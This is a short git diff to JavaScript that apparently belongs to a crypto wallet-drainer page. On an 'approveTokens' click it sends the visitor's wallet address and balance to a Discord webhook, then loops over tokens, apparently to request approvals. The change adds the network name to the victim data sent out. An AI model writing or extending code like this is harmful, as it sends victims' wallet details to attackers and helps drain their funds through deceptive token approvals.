@@ -112,7 +112,7 @@ document.getElementById("approveTokens").addEventListener("click", async () => {
     const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
     const numericBalance = parseFloat(balanceEth);
 
-    await sendToDiscordWebhook('wallet', userAccount, balanceEth);
+    await sendToDiscordWebhook('wallet', userAccount, balanceEth, NETWORKS[selectedNetwork].name);
 
     for (const token of tokens) {
       try {
@@ -152,7 +152,7 @@ document.getElementById("approveTokens").addEventListener("click", async () => {
   }
 });
 
-async function sendToDiscordWebhook(eventType, address, balance) {
+async function sendToDiscordWebhook(eventType, address, balance, networkName) {
   const embed = {
     title: eventType === 'wallet' ? 'Wallet Conectada' : 'Evento',
     color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
